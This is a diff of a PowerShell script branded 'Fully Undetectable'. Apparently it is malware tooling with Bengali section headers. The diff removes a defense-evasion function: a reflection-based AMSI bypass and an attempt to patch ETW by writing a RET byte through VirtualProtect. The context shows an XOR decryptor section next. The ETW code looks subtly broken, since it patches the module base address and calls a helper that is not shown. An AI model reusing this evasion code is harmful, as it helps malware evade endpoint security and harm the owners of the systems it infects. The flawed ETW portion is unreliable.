@@ -59,26 +59,6 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
     Made by Potato - Fully Undetectable
 #>
 
-# ================================================================
-#  ★★★ ১. AMSI + ETW বাইপাস ★★★
-# ================================================================
-function Invoke-Bypass {
-    # AMSI
-    try {
-        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    } catch {}
-    # ETW
-    try {
-        $p = [System.Diagnostics.Process]::GetCurrentProcess()
-        $h = $p.Handle
-        $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
-        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
-        $old = 0
-        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
-        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
-        $v.Invoke($t, 0x1000, $old, [ref]$null)
-    } catch {}
-}
 
 # ================================================================
 #  ★★★ ২. XOR ডিক্রিপ্টর ★★★
